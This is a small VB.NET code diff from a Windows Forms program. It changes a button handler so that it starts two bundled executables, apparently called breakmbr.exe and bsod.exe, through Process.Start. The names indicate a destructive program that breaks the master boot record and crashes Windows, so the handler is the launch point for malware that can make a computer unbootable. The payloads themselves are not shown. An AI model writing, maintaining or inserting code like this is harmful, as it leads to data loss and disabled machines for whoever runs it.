@@ -78,7 +78,7 @@ Public Class Form1
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
-        Shell(Application.StartupPath + "\breakmbr.exe")
-        Shell(Application.StartupPath + "\bsod.exe")
+        Process.Start(Application.StartupPath + "\breakmbr.exe")
+        Process.Start(Application.StartupPath + "\bsod.exe")
     End Sub
 End Class
